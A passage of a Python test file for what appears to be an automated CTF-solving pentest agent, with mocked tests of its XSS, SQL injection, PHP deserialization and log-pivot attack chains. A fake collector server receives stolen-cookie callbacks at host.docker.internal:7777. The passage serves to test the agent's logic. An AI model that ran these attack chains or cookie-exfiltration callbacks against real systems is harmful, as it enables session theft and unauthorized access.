        async def start(self) -> None:
            self.started += 1

        async def stop(self) -> None:
            self.stopped += 1

        async def wait_for_hit(self, timeout: float = 6.0) -> str | None:
            self.wait_calls += 1
            return next(hits)

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._CollectorServer",
        _FakeCollectorServer,
    )

    runtime = _VisitUrlExhaustedRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    outcome = await dispatcher._attempt_visit_url_chain("http://127.0.0.1:3000")

    assert outcome.flag is None
    assert outcome.progress is False
    assert outcome.reason == "visit-url modes exhausted"
    assert len(_FakeCollectorServer.instances) == 1
    collector = _FakeCollectorServer.instances[0]
    assert collector.started == 1
    assert collector.stopped == 1
    assert collector.wait_calls == 4
    assert [
        request[1]
        for request in runtime.requests
        if request[0] == "request"
    ] == ["http://127.0.0.1:3000/visit"] * 4
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_visit_url_exhaustion_is_not_replayed_across_web_and_xss_chains(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_visit_url_dedupe.json")
    notes_module._notes.clear()

    hits = iter(
        [
            "/c?err=TypeError%3A%20Failed%20to%20fetch",
            "/c?cookie=",
            "/c?openErr=SecurityError%3A%20Blocked",
            "/c?iframeErr=TypeError%3A%20Cannot%20read%20properties%20of%20null%20%28reading%20%27body%27%29",
        ]
    )

    class _FakeCollectorServer:
        instances: list["_FakeCollectorServer"] = []

        def __init__(self, target_base: str, host: str = "0.0.0.0", port: int = 7777):
            self.target_base = target_base
            self.host = host
            self.port = port
            self.started = 0
            self.stopped = 0
            self.wait_calls = 0
            _FakeCollectorServer.instances.append(self)

        @property
        def base_url(self) -> str:
            return "http://host.docker.internal:7777"

        def exploit_url(self, mode: str) -> str:
            return f"{self.base_url}/exploit.html?mode={mode}"

        async def start(self) -> None:
            self.started += 1

        async def stop(self) -> None:
            self.stopped += 1

        async def wait_for_hit(self, timeout: float = 6.0) -> str | None:
            self.wait_calls += 1
            return next(hits)

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher._CollectorServer",
        _FakeCollectorServer,
    )

    runtime = _VisitUrlExhaustedRuntime()
    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None, verification_callback=lambda flag: "yes")
    dispatcher.state = CTFState(target="http://127.0.0.1:3000", goal="拿到flag", detected_type="web")

    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    async def _fake_execute_web_chain(target: str, page_features: dict[str, object], hint: str) -> _ChainOutcome:
        return _ChainOutcome(progress=False, reason="web exhausted")

    dispatcher._execute_web_chain = _fake_execute_web_chain  # type: ignore[method-assign]

    page_features = {
        "endpoints": ["/visit", "/admin"],
        "forms": [
            {
                "action": "http://127.0.0.1:3000/login",
                "method": "post",
                "inputs": [
                    {"name": "username", "type": "text"},
                    {"name": "password", "type": "password"},
                ],
            }
        ],
    }

    web_outcome = await dispatcher._execute_chain(
        chain_name="web",
        target="http://127.0.0.1:3000",
        page_features=page_features,
        hint="",
    )
    xss_outcome = await dispatcher._execute_chain(
        chain_name="xss",
        target="http://127.0.0.1:3000",
        page_features=page_features,
        hint="",
    )

    assert web_outcome.progress is False
    assert xss_outcome.progress is False
    assert len(_FakeCollectorServer.instances) == 1
    collector = _FakeCollectorServer.instances[0]
    assert collector.started == 1
    assert collector.stopped == 1
    assert collector.wait_calls == 4
    assert len([request for request in runtime.requests if request[0] == "request"]) == 4
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_xss_chain_can_pivot_to_local_compose_logs_for_admin_login(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text("services:\n  app:\n    image: easy_login-app\n", encoding="utf-8")
    set_notes_file(tmp_path / "notes_local_compose_log_pivot.json")
    notes_module._notes.clear()

    runtime = _LocalChallengeLogPivotRuntime(expected_password="super-secret-admin-pass")
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(target="http://127.0.0.1:3000", goal="拿到flag", detected_type="web")

    outcome = await dispatcher._execute_xss_chain(
        "http://127.0.0.1:3000",
        {
            "url": "http://127.0.0.1:3000/",
            "endpoints": ["/admin"],
            "forms": [
                {
                    "action": "http://127.0.0.1:3000/login",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                    ],
                }
            ],
        },
        str(challenge_dir),
    )

    assert outcome.flag == "flag{local_compose_log_pivot_ok}"
    assert outcome.progress is True
    assert "local challenge log pivot" in (outcome.reason or "").lower()
    assert any("docker compose" in command.lower() for command in runtime.commands)
    assert any(str(challenge_dir) in command for command in runtime.commands)
    assert any(
        request[0] == "request"
        and request[1] == "http://127.0.0.1:3000/login"
        and request[2].get("data") == {"username": "admin", "password": "super-secret-admin-pass"}
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_local_compose_log_pivot_prefers_discovered_login_endpoint_over_root_form_action(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login_js_form"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text("services:\n  app:\n    image: easy_login-app\n", encoding="utf-8")
    set_notes_file(tmp_path / "notes_local_compose_js_form_pivot.json")
    notes_module._notes.clear()

    runtime = _LocalChallengeLogPivotRuntime(expected_password="js-form-admin-pass")
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(target="http://127.0.0.1:3000", goal="拿到flag", detected_type="web")

    outcome = await dispatcher._attempt_local_challenge_log_pivot(
        target="http://127.0.0.1:3000",
        page_features={
            "url": "http://127.0.0.1:3000/",
            "endpoints": ["/login", "/admin", "/visit"],
            "forms": [
                {
                    "action": "http://localhost:3000/",
                    "method": "get",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                    ],
                }
            ],
        },
        hint=str(challenge_dir),
    )

    assert outcome.flag == "flag{local_compose_log_pivot_ok}"
    assert any(
        request[0] == "request"
        and request[1] == "http://127.0.0.1:3000/login"
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_local_compose_log_pivot_prefers_registered_artifact_truth_over_missing_hint(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login_registry"
    challenge_dir.mkdir()
    compose_path = challenge_dir / "docker-compose.yml"
    compose_path.write_text(
        "services:\n  app:\n    image: easy_login-app\n",
        encoding="utf-8",
    )
    set_notes_file(tmp_path / "notes_local_compose_registry_pivot.json")
    notes_module._notes.clear()

    runtime = _LocalChallengeLogPivotRuntime(expected_password="registry-admin-pass")
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://127.0.0.1:3000",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher._setup_artifact_registry(
        run_id="run-registry-compose-pivot",
        registry_root=tmp_path / "loot" / "artifact_registry",
    )
    assert dispatcher._artifact_registry is not None
    dispatcher._artifact_registry.register_artifact(
        run_id=dispatcher._artifact_run_id,
        kind="local_challenge_root",
        title="easy_login_registry",
        path=str(challenge_dir),
        location=str(challenge_dir),
        producer="local_challenge_context",
        metadata={"kind": "challenge_root"},
    )
    dispatcher._artifact_registry.register_artifact(
        run_id=dispatcher._artifact_run_id,
        kind="local_challenge_compose_file",
        title="docker-compose.yml",
        path=str(compose_path),
        location=str(compose_path),
        producer="local_challenge_context",
        metadata={"kind": "challenge_compose_file"},
    )

    outcome = await dispatcher._attempt_local_challenge_log_pivot(
        target="http://127.0.0.1:3000",
        page_features={
            "url": "http://127.0.0.1:3000/",
            "endpoints": ["/admin"],
            "forms": [
                {
                    "action": "http://127.0.0.1:3000/login",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                    ],
                }
            ],
        },
        hint="",
    )

    assert outcome.flag == "flag{local_compose_log_pivot_ok}"
    assert outcome.progress is True
    assert any("docker compose" in command.lower() for command in runtime.commands)
    assert any(str(challenge_dir) in command for command in runtime.commands)
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_local_compose_log_pivot_uses_source_hint_admin_route_when_endpoint_not_rendered(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login_source_admin"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n",
        encoding="utf-8",
    )
    set_notes_file(tmp_path / "notes_local_compose_source_admin.json")
    notes_module._notes.clear()

    runtime = _LocalChallengeLogPivotRuntime(expected_password="source-admin-pass")
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://127.0.0.1:3000",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/admin')\n@app.route('/login')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    outcome = await dispatcher._attempt_local_challenge_log_pivot(
        target="http://127.0.0.1:3000",
        page_features={
            "url": "http://127.0.0.1:3000/",
            "endpoints": [],
            "forms": [
                {
                    "action": "http://127.0.0.1:3000/login",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                    ],
                }
            ],
        },
        hint=str(challenge_dir),
    )

    assert outcome.flag == "flag{local_compose_log_pivot_ok}"
    assert any(
        request[0] == "request"
        and request[1] == "http://127.0.0.1:3000/login"
        and request[2].get("data") == {"username": "admin", "password": "source-admin-pass"}
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_local_compose_log_pivot_prefers_source_hint_login_route_over_root_action(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login_source_login"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n",
        encoding="utf-8",
    )
    set_notes_file(tmp_path / "notes_local_compose_source_login.json")
    notes_module._notes.clear()

    runtime = _LocalChallengeLogPivotRuntime(expected_password="source-login-pass")
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://127.0.0.1:3000",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/admin')\n@app.route('/login')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    outcome = await dispatcher._attempt_local_challenge_log_pivot(
        target="http://127.0.0.1:3000",
        page_features={
            "url": "http://127.0.0.1:3000/",
            "endpoints": ["/admin"],
            "forms": [
                {
                    "action": "http://localhost:3000/",
                    "method": "get",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                    ],
                }
            ],
        },
        hint=str(challenge_dir),
    )

    assert outcome.flag == "flag{local_compose_log_pivot_ok}"
    assert any(
        request[0] == "request"
        and request[1] == "http://127.0.0.1:3000/login"
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_local_compose_log_pivot_replays_generic_session_cookie_from_login_response(
    monkeypatch, tmp_path
):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    challenge_dir = tmp_path / "easy_login_session_cookie"
    challenge_dir.mkdir()
    (challenge_dir / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: easy_login-app\n",
        encoding="utf-8",
    )
    set_notes_file(tmp_path / "notes_local_compose_session_cookie.json")
    notes_module._notes.clear()

    runtime = _LocalChallengeSessionCookiePivotRuntime(expected_password="django-admin-pass")
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://127.0.0.1:3000",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "views.py: request.session['is_admin']=True\n@app.route('/admin')\n@app.route('/login')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\views.py"},
    )

    outcome = await dispatcher._attempt_local_challenge_log_pivot(
        target="http://127.0.0.1:3000",
        page_features={
            "url": "http://127.0.0.1:3000/",
            "endpoints": [],
            "forms": [
                {
                    "action": "http://127.0.0.1:3000/login",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                    ],
                }
            ],
        },
        hint=str(challenge_dir),
    )

    assert outcome.flag == "flag{session_cookie_pivot_ok}"
    assert any(
        request[0] == "request"
        and request[1] == "http://127.0.0.1:3000/admin"
        and str((request[2].get("headers") or {}).get("Cookie") or "") == "sessionid=django-admin-session"
        for request in runtime.requests
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_recon_contract_ingests_registered_local_source_hints_from_key_files(
    monkeypatch, tmp_path
):
    challenge_dir = tmp_path / "easy_login_sources"
    challenge_dir.mkdir()
    (challenge_dir / "README.md").write_text(
        "# easy_login\nRun docker compose up first.\n",
        encoding="utf-8",
    )
    (challenge_dir / "app.py").write_text(
        "from flask import Flask\napp = Flask(__name__)\n@app.route('/admin')\ndef admin():\n    return 'flag?'\n",
        encoding="utf-8",
    )

    async def _fake_phase_recon(target):
        return {
            "url": target,
            "html": "",
            "content": "",
            "forms": [],
            "endpoints": [],
            "recon_missing_tools": [],
        }

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://127.0.0.1:3000",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher._setup_artifact_registry(
        run_id="run-local-source-hints",
        registry_root=tmp_path / "loot" / "artifact_registry",
    )
    dispatcher._challenge_context = {"challengePath": str(challenge_dir)}
    monkeypatch.setattr(dispatcher, "_phase_recon", _fake_phase_recon)

    page_features, early_result = await dispatcher.coordinator._apply_recon_contract(
        dispatcher,
        target="http://127.0.0.1:3000",
    )

    assert early_result is None
    assert page_features["url"] == "http://127.0.0.1:3000"
    source_hints = [
        obs for obs in dispatcher.state.observations if obs.kind == "local_challenge_source_hint"
    ]
    assert source_hints
    assert any("README.md" in obs.value and "Run docker compose up first" in obs.value for obs in source_hints)
    assert any("app.py" in obs.value and "@app.route('/admin')" in obs.value for obs in source_hints)


def test_select_primary_strategy_prefers_source_first_when_local_source_hints_exist():
    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/admin')\ndef admin(): ...",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    strategy = dispatcher._select_primary_strategy(
        "web",
        target="http://ctf.local",
        page_features={
            "content": "captcha proof-of-work challenge",
            "html": "<form><input name='pow' /></form><script src='/static/pow.py'></script>",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        hint="",
    )

    assert strategy is not None
    assert strategy.kind == "backup_source_leak"


def test_primary_capability_for_web_prefers_http_requests_from_app_route_source_hints():
    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/login')\n@app.route('/admin')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    assert dispatcher._primary_capability_for_chain("web") == "http_request_basic"


def test_primary_capability_for_web_prefers_php_deserialization_from_unserialize_source_hints():
    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "index.php: <?php unserialize($_GET['data']); ?>",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_php\index.php"},
    )

    assert dispatcher._primary_capability_for_chain("web") == "php_deserialization_test"


def test_select_primary_strategy_prefers_hash_guarded_read_from_source_hints():
    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: filename + filehash + cookie_secret",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_tornado\app.py"},
    )

    strategy = dispatcher._select_primary_strategy(
        "web",
        target="http://ctf.local",
        page_features={
            "content": "",
            "html": "",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        hint="",
    )

    assert strategy is not None
    assert strategy.kind == "hash_guarded_file_read"


def test_select_primary_strategy_prefers_php_unserialize_strategy_from_source_hints():
    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        (
            "index.php: <?php class User { private $username; private $password; "
            "function __destruct(){} } unserialize($_GET['data']); ?>"
        ),
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_php\index.php"},
    )

    strategy = dispatcher._select_primary_strategy(
        "web",
        target="http://ctf.local",
        page_features={
            "content": "",
            "html": "",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        hint="",
    )

    assert strategy is not None
    assert strategy.kind == "php_unserialize_magic_method"


@pytest.mark.asyncio
async def test_execute_web_chain_runs_backup_source_before_contact_when_local_source_hints_exist(
    monkeypatch,
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "README.md: docker compose up\napp.py: @app.route('/admin')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\README.md"},
    )

    called_kinds: list[str] = []

    async def _wrapped_execute(kind: str, context):
        called_kinds.append(kind)
        return _ChainOutcome(progress=False, reason=kind)

    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    await dispatcher._execute_web_chain(
        "http://ctf.local/",
        {
            "content": "captcha proof-of-work challenge",
            "html": "<form><input name='pow' /></form><script src='/static/pow.py'></script>",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        "",
    )

    assert "backup_source_leak" in called_kinds
    assert "contact_report_chain" in called_kinds
    assert called_kinds.index("backup_source_leak") < called_kinds.index("contact_report_chain")


@pytest.mark.asyncio
async def test_execute_web_chain_runs_hash_guarded_before_backup_when_filehash_source_hints_exist(
    monkeypatch,
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: filename=file&filehash=md5(cookie_secret+md5(filename))",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_tornado\app.py"},
    )

    called_kinds: list[str] = []

    async def _wrapped_execute(kind: str, context):
        called_kinds.append(kind)
        return _ChainOutcome(progress=False, reason=kind)

    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    await dispatcher._execute_web_chain(
        "http://ctf.local/",
        {
            "content": "",
            "html": "",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        "",
    )

    assert "hash_guarded_file_read" in called_kinds
    assert "backup_source_leak" in called_kinds
    assert called_kinds.index("hash_guarded_file_read") < called_kinds.index("backup_source_leak")


@pytest.mark.asyncio
async def test_execute_web_chain_runs_php_unserialize_before_backup_when_source_hints_exist(
    monkeypatch,
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        (
            "index.php: <?php class User { private $username; private $password; "
            "function __destruct(){} } unserialize($_GET['data']); ?>"
        ),
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_php\index.php"},
    )

    called_kinds: list[str] = []

    async def _wrapped_execute(kind: str, context):
        called_kinds.append(kind)
        return _ChainOutcome(progress=False, reason=kind)

    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    await dispatcher._execute_web_chain(
        "http://ctf.local/",
        {
            "content": "",
            "html": "",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        "",
    )

    assert "php_unserialize_magic_method" in called_kinds
    assert "backup_source_leak" in called_kinds
    assert called_kinds.index("php_unserialize_magic_method") < called_kinds.index("backup_source_leak")


@pytest.mark.asyncio
async def test_execute_xss_chain_runs_stored_xss_when_source_hints_expose_visit_admin_routes(
    monkeypatch,
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/visit')\n@app.route('/admin')\n@app.route('/login')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    called_kinds: list[str] = []

    async def _wrapped_execute(kind: str, context):
        called_kinds.append(kind)
        return _ChainOutcome(progress=False, reason=kind)

    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    await dispatcher._execute_xss_chain(
        "http://ctf.local/",
        {
            "content": "",
            "html": "",
            "endpoints": ["/login"],
            "raw_links": [],
            "forms": [
                {
                    "action": "http://ctf.local/login",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                        {"name": "message", "type": "text"},
                    ],
                }
            ],
        },
        "",
    )

    assert "xss_admin_bot_sid" in called_kinds


@pytest.mark.asyncio
async def test_execute_chain_web_returns_xss_progress_from_source_hints_before_web_fallback(
    monkeypatch,
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/visit')\n@app.route('/admin')\n@app.route('/login')",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    called_kinds: list[str] = []
    web_called: list[bool] = []

    async def _wrapped_execute(kind: str, context):
        called_kinds.append(kind)
        if kind == "xss_admin_bot_sid":
            return _ChainOutcome(progress=True, reason="xss_admin_bot_sid")
        return _ChainOutcome(progress=False, reason=kind)

    async def _fake_web_chain(target: str, page_features: dict[str, object], hint: str):
        web_called.append(True)
        return _ChainOutcome(progress=False, reason="web fallback")

    monkeypatch.setattr(dispatcher.strategy_registry, "execute", _wrapped_execute)
    monkeypatch.setattr(dispatcher, "_execute_web_chain", _fake_web_chain)
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    outcome = await dispatcher._execute_chain(
        chain_name="web",
        target="http://ctf.local/",
        page_features={
            "content": "",
            "html": "",
            "endpoints": ["/login"],
            "raw_links": [],
            "forms": [
                {
                    "action": "http://ctf.local/login",
                    "method": "post",
                    "inputs": [
                        {"name": "username", "type": "text"},
                        {"name": "password", "type": "password"},
                        {"name": "message", "type": "text"},
                    ],
                }
            ],
        },
        hint="",
    )

    assert outcome.progress is True
    assert outcome.reason
    assert "xss_admin_bot_sid" in outcome.reason
    assert "xss_admin_bot_sid" in called_kinds
    assert web_called == []


@pytest.mark.asyncio
async def test_execute_xss_chain_runs_visit_url_fallback_from_source_hints_when_endpoint_not_rendered(
    monkeypatch,
):
    from pentestagent.agents.pa_agent.ctf_dispatcher import _ChainOutcome

    dispatcher = CTFTaskDispatcher(
        runtime=_DispatcherRuntime(),
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )
    dispatcher.state = CTFState(
        target="http://ctf.local",
        goal="拿到flag",
        detected_type="web",
    )
    dispatcher.state.add_observation(
        "local_challenge_source_hint",
        "app.py: @app.route('/visit')\ndef visit(): ...",
        source="local_challenge_context",
        metadata={"path": r"D:\webstudy\CTF\easy_login\app.py"},
    )

    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )

    async def _fake_visit_url_chain(base: str):
        return _ChainOutcome(progress=True, reason="visit-url source-hint fallback")

    monkeypatch.setattr(dispatcher, "_attempt_visit_url_chain", _fake_visit_url_chain)

    outcome = await dispatcher._execute_xss_chain(
        "http://ctf.local/",
        {
            "content": "",
            "html": "",
            "endpoints": [],
            "raw_links": [],
            "forms": [],
        },
        "",
    )

    assert outcome.progress is True
    assert outcome.reason == "visit-url source-hint fallback"


@pytest.mark.asyncio
async def test_ctf_dispatcher_solves_auth_form_sqli(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_sqli.json")
    notes_module._notes.clear()

    runtime = _DispatcherSQLiRuntime()
    dispatcher = CTFTaskDispatcher(
        runtime=runtime,
        progress_callback=None,
        verification_callback=lambda flag: "yes",
    )

    result = await dispatcher.run(
        target="http://ctf.local/",
        goal="拿到flag",
        type="sqli",
        hint="",
    )

    assert result.success is True
    assert result.flag == "flag{dispatcher_sqli_ok}"
    assert "sqli" in result.chain_used
    assert "SQLi" in result.reason or "sqli" in result.reason.lower()
    assert dispatcher.state is not None
    assert any(
        item.kind == "auth_form_sqli" for item in dispatcher.state.hypotheses
    )
    assert any(
        record.value == "flag{dispatcher_sqli_ok}"
        for record in dispatcher.state.verified_flags
    )
    notes_module._notes.clear()
    notes_module._custom_notes_file = None
    notes_module._loaded_notes_file = None


@pytest.mark.asyncio
async def test_ctf_dispatcher_solves_unicode_numeric_form_bypass(monkeypatch, tmp_path):
    monkeypatch.setattr(
        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
        lambda self, tools: {},
    )
    set_notes_file(tmp_path / "notes_unicode_numeric.json")
    notes_module._notes.clear()

